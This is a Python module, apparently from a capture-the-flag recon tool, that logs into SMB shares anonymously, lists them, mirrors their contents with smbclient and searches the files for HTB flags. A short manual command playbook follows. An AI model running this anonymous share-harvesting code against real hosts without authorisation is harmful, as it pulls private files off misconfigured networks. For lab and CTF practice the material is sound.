"""Explotación SMB anónima — enumeración de shares y búsqueda de flag.txt."""

from __future__ import annotations

import re
import shutil
import subprocess
import tempfile
from pathlib import Path
from typing import Any

FLAG_FILENAMES = ("flag.txt", "user.txt", "root.txt")
FLAG_PATTERN = re.compile(r"(HTB\{[^}]+\}|[a-f0-9]{32})", re.I)
SHARE_SKIP = {"IPC$", "ADMIN$", "print$", "C$", "D$", "E$", "NETLOGON", "SYSVOL"}
LISTING_RE = re.compile(r"^\s*([^\s$]+)\s+(Disk|Printer)\s", re.MULTILINE)


def _append_step(steps: list[dict], action: str, detail: str, status: str = "ok") -> None:
    steps.append({"action": action, "detail": detail, "status": status})


def _smbclient_bin() -> str:
    path = shutil.which("smbclient")
    if not path:
        raise FileNotFoundError("smbclient no encontrado (instala samba-common-bin en Kali)")
    return path


def _run_smb(args: list[str], timeout: int = 90) -> tuple[str, int]:
    cmd = [_smbclient_bin(), *args]
    proc = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=timeout,
        errors="replace",
    )
    return proc.stdout + proc.stderr, proc.returncode


def _parse_shares(listing_output: str) -> list[str]:
    shares: list[str] = []
    for match in LISTING_RE.finditer(listing_output):
        name = match.group(1)
        if name.upper() in SHARE_SKIP or name.endswith("$"):
            continue
        if match.group(2) == "Disk":
            shares.append(name)
    return shares


def _parse_ls_entries(ls_output: str) -> tuple[list[str], list[str]]:
    dirs: list[str] = []
    files: list[str] = []
    for line in ls_output.splitlines():
        line = line.rstrip()
        if not line.strip() or line.strip().startswith("."):
            if line.strip() in (".", ".."):
                continue
        match = re.search(r"^\s+(\S+)\s+(D|A)\s", line)
        if match:
            name, kind = match.group(1), match.group(2)
            if name in (".", ".."):
                continue
            if kind == "D":
                dirs.append(name)
            else:
                files.append(name)
    return dirs, files


def _extract_flags_from_text(text: str, filename: str = "flag.txt") -> list[dict]:
    flags: list[dict] = []
    for match in FLAG_PATTERN.findall(text):
        flags.append({"filename": filename, "content": match})
    clean = text.strip()
    if not flags and clean and len(clean) < 200 and "NT_STATUS" not in clean:
        last = clean.splitlines()[-1].strip()
        if last and "cannot" not in last.lower():
            flags.append({"filename": filename, "content": last})
    return flags


def _smb_ls(host: str, share: str, subpath: str = "") -> str:
    target = f"//{host}/{share}"
    cmd = "ls"
    if subpath:
        cmd = f"cd {subpath}; ls"
    out, _ = _run_smb([target, "-N", "-c", cmd])
    return out


def _smb_get(host: str, share: str, remote: str, local_dir: Path) -> Path | None:
    target = f"//{host}/{share}"
    local_dir.mkdir(parents=True, exist_ok=True)
    remote_cmd = remote.replace("\\", "/")
    out, rc = _run_smb(
        [target, "-N", "-c", f"lcd {local_dir}; get {remote_cmd}"],
        timeout=60,
    )
    local_file = local_dir / Path(remote_cmd).name
    if local_file.is_file():
        return local_file
    if rc == 0 and out:
        return local_file if local_file.is_file() else None
    return None


def _smb_mirror_dir(host: str, share: str, subpath: str, local_dir: Path) -> list[Path]:
    target = f"//{host}/{share}"
    local_dir.mkdir(parents=True, exist_ok=True)
    if subpath:
        command = f"cd {subpath}; lcd {local_dir}; recurse; prompt OFF; mget *"
    else:
        command = f"lcd {local_dir}; recurse; prompt OFF; mget *"
    _run_smb([target, "-N", "-c", command], timeout=120)
    return [p for p in local_dir.rglob("*") if p.is_file()]


def _scan_local_files(files: list[Path]) -> list[dict]:
    flags: list[dict] = []
    for path in files:
        if path.name.lower() in FLAG_FILENAMES or path.suffix == ".txt":
            try:
                content = path.read_text(encoding="utf-8", errors="replace")
                flags.extend(_extract_flags_from_text(content, path.name))
            except OSError:
                continue
    return flags


def probe_smb_anonymous(host: str) -> dict[str, Any]:
    steps: list[dict] = []
    result: dict[str, Any] = {
        "module": "smb_anonymous",
        "host": host,
        "port": 445,
        "success": False,
        "shares": [],
        "steps": steps,
        "flags": [],
        "error": None,
    }

    try:
        _smbclient_bin()
    except FileNotFoundError as exc:
        result["error"] = str(exc)
        _append_step(steps, "error", str(exc), status="error")
        return result

    try:
        _append_step(steps, "list_shares", f"smbclient -L //{host} -N")
        listing, rc = _run_smb(["-L", f"//{host}", "-N"], timeout=60)
        _append_step(steps, "list_output", listing[:400] or "(vacío)")

        shares = _parse_shares(listing)
        if not shares:
            result["error"] = "No se encontraron shares SMB accesibles (anónimo)"
            _append_step(steps, "error", result["error"], status="error")
            return result

        result["shares"] = shares
        _append_step(steps, "shares_found", ", ".join(shares))

        with tempfile.TemporaryDirectory(prefix="recontool_smb_") as tmp:
            tmp_path = Path(tmp)
            for share in shares:
                _append_step(steps, "explore_share", f"Share: {share}")
                ls_root = _smb_ls(host, share)
                _append_step(steps, "ls", f"{share}/ → {ls_root[:220].strip()}")

                root_dirs, root_files = _parse_ls_entries(ls_root)
                locations: list[tuple[str, list[str]]] = [("", root_files)]
                for sub in root_dirs:
                    ls_sub = _smb_ls(host, share, sub)
                    _, sub_files = _parse_ls_entries(ls_sub)
                    locations.append((sub, sub_files))
                    _append_step(steps, "ls", f"{share}/{sub}/ → {ls_sub[:180].strip()}")

                for sub, file_list in locations:
                    label = f"{share}/{sub}" if sub else share
                    local_sub = tmp_path / share / (sub or "root")

                    for fname in file_list:
                        if fname not in FLAG_FILENAMES and not fname.endswith(".txt"):
                            continue
                        remote = f"{sub}/{fname}" if sub else fname
                        got = _smb_get(host, share, remote, local_sub)
                        if got and got.is_file():
                            _append_step(steps, "get", f"Descargado {remote}")
                            flags = _extract_flags_from_text(
                                got.read_text(encoding="utf-8", errors="replace"),
                                fname,
                            )
                            if flags:
                                result["flags"] = flags
                                result["success"] = True
                                return result

                    downloaded = _smb_mirror_dir(host, share, sub, local_sub)
                    if downloaded:
                        _append_step(
                            steps,
                            "mget",
                            f"{label}: {len(downloaded)} archivo(s)",
                        )
                    flags = _scan_local_files(downloaded)
                    if flags:
                        result["flags"] = flags
                        result["success"] = True
                        return result

        result["error"] = "Shares explorados pero no se encontró flag.txt"
        _append_step(steps, "error", result["error"], status="error")

    except subprocess.TimeoutExpired:
        result["error"] = "Timeout en operación SMB"
        _append_step(steps, "error", result["error"], status="error")
    except Exception as exc:
        result["error"] = str(exc)
        _append_step(steps, "error", str(exc), status="error")

    return result


def manual_smb_playbook(host: str) -> list[str]:
    return [
        f"smbclient -L //{host} -N",
        f"smbclient //{host}/<share> -N",
        "ls",
        "cd <carpeta>",
        "recurse",
        "prompt OFF",
        "mget *",
        "cat flag.txt",
    ]
